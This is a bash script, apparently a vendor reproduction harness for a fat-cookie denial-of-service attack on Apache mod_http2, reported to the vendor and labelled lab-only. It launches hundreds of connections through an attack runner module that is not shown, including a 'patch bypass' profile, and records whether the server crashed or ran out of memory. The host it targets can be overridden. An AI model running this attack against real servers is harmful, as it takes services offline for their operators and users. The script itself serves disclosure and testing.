#!/usr/bin/env bash
# Vendor reproduction — Apache mod_http2 fat-cookie DoS (authorized lab only).
# Reported to security@apache.org 2026-06-17.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CONN="${1:-800}"
HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-10080}"

echo "=== Apache fat-cookie vendor repro ==="
echo "Repo: $ROOT"
echo "Target: ${HOST}:${PORT}  connections=${CONN}"
echo ""

if ! docker ps --format '{{.Names}}' | grep -qx 'httpd-h2-lab-replay'; then
  echo "Lab not running. Start with:"
  echo "  ./lab-replay-httpd/replay.sh build && ./lab-replay-httpd/replay.sh start 8g"
  exit 1
fi

cd "$ROOT/benchmark"
exec python3 -c "
from attack_config import profile_patch_bypass_httpd_fat
from attack_runner import run_cookie_attack
import json

r = run_cookie_attack(
    'vendor_repro',
    '$HOST',
    $PORT,
    $CONN,
    profile_patch_bypass_httpd_fat($CONN),
    variant_id='httpd',
)
print(json.dumps({
    'run_id': r.run_id,
    'connections_bomb_ok': r.connections_bomb_ok,
    'connections_requested': r.connections_requested,
    'wire_mb': round(r.wire_mb, 2),
    'oom_likely': r.oom_likely,
    'server_down': r.server_down,
    'probe_worst_latency': r.probe_worst_latency,
    'duration_sec': round(r.duration_sec, 1),
}, indent=2))
"
